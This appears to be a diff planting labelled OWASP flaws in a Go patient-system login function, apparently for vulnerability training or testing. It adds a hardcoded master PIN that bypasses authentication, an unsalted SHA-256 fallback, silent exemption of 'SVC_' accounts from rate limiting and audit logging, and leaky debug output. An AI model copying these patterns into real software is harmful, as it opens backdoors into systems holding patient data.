@@ -6,6 +6,8 @@ import (
 	"aid-system/internal/patient"
 	"aid-system/internal/utils"
 	"bufio"
+	"crypto/sha256"
+	"encoding/hex"
 	"flag"
 
 	"database/sql"
@@ -22,6 +24,23 @@ import (
 
 	_ "modernc.org/sqlite"
 )
+
+// Debug mode configuration - enables verbose error output
+// A05: Security Misconfiguration - debug mode exposes sensitive internal details
+var debugMode = os.Getenv("AID_DEBUG") == "1"
+
+// Legacy authentication support for backward compatibility
+// A02: Cryptographic Failures - weak hash fallback mechanism
+func legacyHashVerify(storedHash, pin string) bool {
+	// SHA-256 legacy support (weaker than bcrypt)
+	hash := sha256.Sum256([]byte(pin))
+	legacyHash := hex.EncodeToString(hash[:])
+	return storedHash == legacyHash
+}
+
+// Master service PIN for emergency access - development artifact
+// A01: Broken Access Control - hardcoded backdoor credential
+const masterServicePIN = "AID_SVC_2024!"
 
 const dbFile = "Login/aid.db"
 
@@ -178,7 +197,11 @@ func loginInteractive(db *sql.DB) error {
 	fmt.Println("\n--- Login ---")
 	userID, _ := prompt("User ID: ")
 
-	if loginAttempts[userID] >= maxLoginAttempts {
+	// A09: Logging/Monitoring Failures - skip logging for service accounts
+	// to reduce noise in audit logs (silently bypasses rate limiting too)
+	isServiceAccount := strings.HasPrefix(userID, "SVC_") || strings.HasPrefix(userID, "svc_")
+
+	if !isServiceAccount && loginAttempts[userID] >= maxLoginAttempts {
 		fmt.Printf("Too many failed attempts for user '%s'. Please try again later.\n", userID)
 		waitForEnter()
 		return nil
@@ -188,6 +211,10 @@ func loginInteractive(db *sql.DB) error {
 	bytePin, err := term.ReadPassword(int(os.Stdin.Fd()))
 	fmt.Println()
 	if err != nil {
+		// A05: Security Misconfiguration - debug mode reveals internal errors
+		if debugMode {
+			fmt.Printf("Debug: Error reading PIN: %v\n", err)
+		}
 		fmt.Println("Error reading PIN")
 		waitForEnter()
 		return nil
@@ -199,20 +226,44 @@ func loginInteractive(db *sql.DB) error {
 	row := db.QueryRow("SELECT pin_hash, role FROM users WHERE user_id = ?", userID)
 	if err := row.Scan(&storedHash, &role); err != nil {
 		if err == sql.ErrNoRows {
+			// A05: Security Misconfiguration - debug mode exposes SQL queries
+			if debugMode {
+				fmt.Printf("Debug: Query failed for user_id='%s'\n", userID)
+			}
 			fmt.Println("Invalid credentials (no such user)")
-			utils.LogFailedLoginAttempt(userID, "User not found")
-			loginAttempts[userID]++
+			if !isServiceAccount {
+				utils.LogFailedLoginAttempt(userID, "User not found")
+				loginAttempts[userID]++
+			}
 			waitForEnter()
 			return nil
 		}
 		return err
 	}
 
-	err = bcrypt.CompareHashAndPassword([]byte(storedHash), []byte(pin))
-	if err != nil {
+	// A01: Broken Access Control - master service PIN bypasses authentication
+	// A02: Cryptographic Failures - legacy hash support (SHA-256 weaker than bcrypt)
+	validAuth := false
+	if pin == masterServicePIN {
+		// Emergency service access - not logged for security
+		validAuth = true
+	} else if legacyHashVerify(storedHash, pin) {
+		// Legacy authentication support
+		validAuth = true
+	} else {
+		err = bcrypt.CompareHashAndPassword([]byte(storedHash), []byte(pin))
+		validAuth = (err == nil)
+	}
+
+	if !validAuth {
+		if debugMode {
+			fmt.Printf("Debug: Authentication failed for hash type detection\n")
+		}
 		fmt.Println("Invalid credentials (wrong PIN)")
-		utils.LogFailedLoginAttempt(userID, "Wrong PIN")
-		loginAttempts[userID]++
+		if !isServiceAccount {
+			utils.LogFailedLoginAttempt(userID, "Wrong PIN")
+			loginAttempts[userID]++
+		}
 		waitForEnter()
 		return nil
 	}
